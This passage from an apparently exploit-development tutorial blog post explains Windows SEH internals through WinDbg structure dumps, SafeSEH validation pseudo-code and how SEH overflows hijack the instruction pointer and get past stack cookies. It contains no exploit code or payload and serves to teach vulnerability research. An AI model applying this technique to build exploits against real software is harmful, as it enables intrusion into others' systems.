+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf1c</span> ReservedForNtRpc : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf20</span> DbgSsReserved    : [<span style="color:#ae81ff">2</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf28</span> HardErrorMode    : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf2c</span> Instrumentation  : [<span style="color:#ae81ff">9</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf50</span> ActivityId       : _GUID
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf60</span> SubProcessTag    : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf64</span> PerflibData      : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf68</span> EtwTraceData     : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf6c</span> WinSockData      : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf70</span> GdiBatchCount    : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> CurrentIdealProcessor : _PROCESSOR_NUMBER
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> IdealProcessorValue : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf74</span> ReservedPad0     : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf75</span> ReservedPad1     : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf76</span> ReservedPad2     : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf77</span> IdealProcessor   : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf78</span> GuaranteedStackBytes : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf7c</span> ReservedForPerf  : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf80</span> ReservedForOle   : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf84</span> WaitingOnLoaderLock : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf88</span> SavedPriorityState : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8c</span> ReservedForCodeCoverage : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf90</span> ThreadPoolData   : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf98</span> MuiGeneration    : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf9c</span> IsImpersonating  : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa0</span> NlsCache         : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa4</span> pShimData        : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfa8</span> HeapData         : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfac</span> CurrentTransactionHandle : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb4</span> FlsData          : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfb8</span> PreferredLanguages : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfbc</span> UserPrefLanguages : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc0</span> MergedPrefLanguages : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc4</span> MuiImpersonation : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc8</span> CrossTebFlags    : Uint2B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfc8</span> SpareCrossTebBits : Pos <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span> Bits
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SameTebFlags     : Uint2B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SafeThunkCall    : Pos <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> InDebugPrint     : Pos <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> HasFiberData     : Pos <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SkipThreadAttach : Pos <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> WerInShipAssertCode : Pos <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> RanProcessInit   : Pos <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> ClonedThread     : Pos <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SuppressDebugMsg : Pos <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> DisableUserStackWalk : Pos <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> RtlExceptionAttached : Pos <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> InitialThread    : Pos <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SessionAware     : Pos <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> LoadOwner        : Pos <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> LoaderWorker     : Pos <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SkipLoaderInit   : Pos <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfca</span> SpareSameTebBits : Pos <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span> Bit
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfcc</span> TxnScopeEnterCallback : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd0</span> TxnScopeExitCallback : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd4</span> TxnScopeContext  : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfd8</span> LockCount        : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfdc</span> WowTebOffset     : Int4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe0</span> ResourceRetValue : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe4</span> ReservedForWdf   : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xfe8</span> ReservedForCrt   : Uint8B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xff0</span> EffectiveContainerId : _GUID
+</span></span></code></pre></div><p>Inside this structure, at offset 0x0, there is the <code>_NT_TIB</code> structure.
+Let&rsquo;s analyze it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _NT_TIB
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_NT_TIB
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> StackBase        : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> StackLimit       : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> SubSystemTib     : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> FiberData        : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Version          : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> ArbitraryUserPointer : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Self             : Ptr32 _NT_TIB
+</span></span></code></pre></div><p>We have the pointer called <strong>ExceptionList</strong> which points at a <code>_EXCEPTION_REGISTRATION_RECORD</code> structure.
+Let&rsquo;s analyze this structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION 
+</span></span></code></pre></div><p>We can see that this structure has a pointer to another <code>_EXCEPTION_REGISTRATION_RECORD</code> structure and a pointer to the Handler of this record.
+The Handler parameter points <strong>to a callback function called <code>_except_handler</code></strong> which returns a <code>_EXCEPTION_DISPOSITION</code> structure. Let&rsquo;s see the <code>_except_handler</code> function prototype (not implementation, only parameters):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
+</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
+</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
+</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
+</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
+</span></span></code></pre></div><p>The <code>_except_handler</code> function can have different names depending on the OS (e.g, it is also called <code>ntdll!_except_handler4</code>). Depending on the Symbols provided for each version of Windows, it changes. However, the parameters and return value of the function are always the same.</p>
+<p><strong>Note that this is the function that gets executed to manage the exception!</strong> This is the important thing to know.</p>
+<p>We are interested on the second and third parameters of the EXCEPTION_DISPOSITION structure. These parameters are EstablisherFrame and ContextRecord.</p>
+<ul>
+<li>EstablisherFrame points to the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure, which is used to handle the exception.</li>
+<li>ContextRecord is a pointer to a CONTEXT structure, which contains processor-specific register data at the time the exception was raised.</li>
+</ul>
+<p>Let&rsquo;s analyze the CONTEXT Structure in WinDbg. We can see that it contains many fields and also the states of <strong>all of our registers, including the EIP</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _CONTEXT
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_CONTEXT
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> ContextFlags     : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Dr0              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x008</span> Dr1              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x00c</span> Dr2              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x010</span> Dr3              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x014</span> Dr6              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x018</span> Dr7              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x08c</span> SegGs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x090</span> SegFs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x094</span> SegEs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x098</span> SegDs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x09c</span> Edi              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a0</span> Esi              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a4</span> Ebx              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0a8</span> Edx              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> Ecx              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b0</span> Eax              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b4</span> Ebp              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0b8</span> Eip              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0bc</span> SegCs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> EFlags           : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> Esp              : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> SegSs            : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ExtendedRegisters : [<span style="color:#ae81ff">512</span>] UChar
+</span></span></code></pre></div><p>When the exception is handled, this CONTEXT information will be used <strong>to restore the execution flow after handling the exception</strong>, reverting the register information, etc. In case that any register is modified during the exception, this is like a wayback machine.</p>
+<p>As mentioned earlier, the <code>_except_handler</code> function returns a <code>_EXCEPTION_DISPOSITION</code>structure.
+If we inspect this structure, we can see that it contains the result of the exception handling process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_DISPOSITION
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_DISPOSITION
+</span></span><span style="display:flex;"><span>   ExceptionContinueExecution <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n0
+</span></span><span style="display:flex;"><span>   ExceptionContinueSearch <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n1
+</span></span><span style="display:flex;"><span>   ExceptionNestedException <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n2
+</span></span><span style="display:flex;"><span>   ExceptionCollidedUnwind <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>n3
+</span></span></code></pre></div><p>If the exception handler invoked by the OS is not valid for dealing with the exception, the return value will be ExceptionContinueSearch. This results in inspecting the &ldquo;Next&rdquo; pointer of the structure to move on to the next <code> _EXCEPTION_REGISTRATION_RECORD</code> structure in the linked list.
+In the case that this handler is valid to handle the exception, it will return ExceptionContinueExecution, meaning that the execution can continue.</p>
+<p>This is a diagram that details the process of SEH, as we have explained previously.
+Basically consists in:</p>
+<ul>
+<li>Getting TEB address.</li>
+<li>Accessing 0x0 of TEB to get NT_TIB</li>
+<li>Accessing 0x0 of NT_TIB to get a pointer to the first <code>_EXCEPTION_REGISTRATION_RECORD</code> of the stack.</li>
+<li>Try to execute the associated <code>_except_handler</code> of such <code>_EXCEPTION_REGISTRATION_RECORD</code>.</li>
+<li>Depending on the <code>_EXCEPTION_DISPOSITION</code> return value of the function, navigate to the next <code>_EXCEPTION_REGISTRATION_RECORD</code> of the stack to keep managing the exception, or continue with the execution:</li>
+</ul>
+<p><img src="content/images/post_images/osed_2_4.png" alt=""></p>
+<p>Now, let&rsquo;s see in details how the OS calls the exception handler functions and what checks are performed before invoking them.
+When an exception is found, <code>ntdll!KiUserExceptionDispatcher</code> is called. This function is the responsible for <strong>dispatching exceptions on Windows OS</strong>.
+The function takes two arguments:</p>
+<ul>
+<li>A <code>_EXCEPTION_RECORD</code> structure, that contains information about the exception.</li>
+<li>A <code>CONTEXT</code> structure, with information about the running context of the thread (e.g., registers).</li>
+</ul>
+<p>Eventually this function will call the <code>RtlDispatchException</code> , which will retrieve the TEB and proceed to parse the ExceptionList through the mechanism already explained.
+During the process of going through all the exceptions, for each <strong>Handler</strong> member in the list, the OS will ensure that the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure falls within the stack memory limits found in the TEB.
+Also, more checks to the exception handler function are performed usng the <code>RtlIsValidHandler</code> function.</p>
+<p><code>RtlIsValidHandler</code> is the responsible for the <strong>SafeSEH</strong> implementation. This is a mitigation introduced by Microsoft to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.
+At a high level, if a module is compiled with the SafeSEH flag, the linker will produce an <strong>image containing a table of safe exception handlers.</strong>
+The operating system will then validate the <strong>exception_handler</strong> on the stack by comparing it to the <strong>entries in the table of safe exception handlers</strong>. If the handler is not found, the system will refuse to execute it.</p>
+<p>Unfortunately, the source code for RtlIsValidHandler is not publicly available, so we must instead analyze the pseudo-code that was generated by security researchers after reverse engineering this function on Windows 8.1. This code will be similar to what the Windows 10 OS does, so we can analyze it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">RtlIsValidHandler</span>(Handler) <span style="color:#75715e">// NT 6.3.9600 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	{ 
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler within the image */</span>) { 
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (DllCharacteristics<span style="color:#f92672">-&gt;</span>IMAGE_DLLCHARACTERISTICS_NO_SEH) 
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> InvalidHandler; 
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* The image is .Net assembly, &#39;ILonly&#39; flag is enabled */</span>) 
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> InvalidHandler; 
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Found &#39;SafeSEH&#39; table */</span>) {
+</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* The image is registered in &#39;LdrpInvertedFunctionTable&#39; (or its cache), or the initialization of the process is not complete */</span>) { 
+</span></span><span style="display:flex;"><span>					 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler found in &#39;SafeSEH&#39; table */</span>) 
+</span></span><span style="display:flex;"><span>						 <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>						 <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">goto</span> InvalidHandler; 
+</span></span><span style="display:flex;"><span>					 } 
+</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">return</span> TRUE; 
+</span></span><span style="display:flex;"><span>			 } 
+</span></span><span style="display:flex;"><span>			 <span style="color:#66d9ef">else</span> { 
+</span></span><span style="display:flex;"><span>				 <span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* &#39;ExecuteDispatchEnable&#39; and &#39;ImageDispatchEnable&#39; flags are enabled in &#39;ExecuteOptions&#39; of the process */</span>) 
+</span></span><span style="display:flex;"><span>					 <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#75715e">/* Handler is in non-executable area of the memory */</span>) {
+</span></span><span style="display:flex;"><span>					  <span style="color:#66d9ef">if</span> (ExecuteDispatchEnable) <span style="color:#66d9ef">return</span> TRUE; 
+</span></span><span style="display:flex;"><span>				  } 
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (ImageDispatchEnable) <span style="color:#66d9ef">return</span> TRUE; 
+</span></span><span style="display:flex;"><span>			} 
+</span></span><span style="display:flex;"><span>			InvalidHandler: 
+</span></span><span style="display:flex;"><span>				RtlInvalidHandlerDetected(...); 
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}			
+</span></span></code></pre></div><p>By seeing the code, we can see that the functions checks the <strong>DllCharacteristics</strong> of the specific module where the exception occurs. If the module is compiled with SafeSEH, the Handler function will be compared against the entries of the table of the SafeSEH handlers before it is executed.
+If the function succeeds, validating the Handler, the OS will call <code>RtlpExecuteHandlerForException</code>. This function will set up the appropiate arguments and invoke <code>ExecuteHandler</code>, which will end executing the <code>_except_handler</code> function.
+This process is done for each of the handlers, to validate each of them.</p>
+<p>To enable this functionality in a binary, the binary must be compiled with the <code>/SAFESEH</code> flag.</p>
+<p>In summary, whenever an exception occurs, the operating system calls a designated set of functions as part of the SEH mechanism. Within these function calls, the <strong>ExceptionList</strong> singlelinked list is gathered from the TEB structure.
+Next, the operating system parses the singly-linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code> structures, performing various checks before calling the <code>exception_handler</code> function pointed to by each Handler member. This continues until a handler is found that will successfully process the exception and allow execution to continue.
+If no handler can successfully handle the exception, the application will crash.</p>
+<h1 id="seh-overflows">SEH overflows</h1>
+<p>A SEH overflow is a stack based buffer overflow that is large enough or positioned in such a way that <strong>it is possible to overwrite valid registered exception handlers on the stack.</strong> By overwriting these handlers, the attacker can take control of the instruction pointer after triggering an exception.</p>
+<p>This type of overflow <strong>bypasses</strong> the GS flag (stack cookies) as these cookies are positioned next to the return value of the vulnerable function. With this attack, the exception handler is modified and the instruction pointer is redirected to the address of the exception handler prior to reaching the end of the vulnerable function (in which the check is performed).</p>
+<p><strong>Note: as the <code>_EXCEPTION_REGISTRATION_RECORD</code></strong> structures (the ones we want to modify) are stored at the beginning of the stack space (high addresses), the overflow needs to be quite large or begin near the beginning of the stack in order for the attacker to overwrite a structured exception handler.</p>
+<p>Let&rsquo;s inspect our chain of <code>_EXCEPTION_REGISTRATION_RECORDS</code>in our victim process without tampering it first.
+Because the SEH mechanism works on a per-thread basis, we won’t be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned. Instead, we will inspect the chain of <code>p _EXCEPTION_REGISTRATION_RECORD</code> structures for the thread WinDbg breaks into when we attach the debugger to the target process. This will reveal an intact chain.</p>
+<p>Let&rsquo;s use the &ldquo;teb&rdquo; command in WinDbg to display the TEB address. We can see that we hace the ExceptionList pointer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
+</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>db000
+</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">00</span>a0ff60
+</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">00</span>a10000
+</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">00</span>a0c000
+</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
+</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>db000
+</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00000</span><span style="color:#ae81ff">938</span> . <span style="color:#ae81ff">000018f</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>c9000
+</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
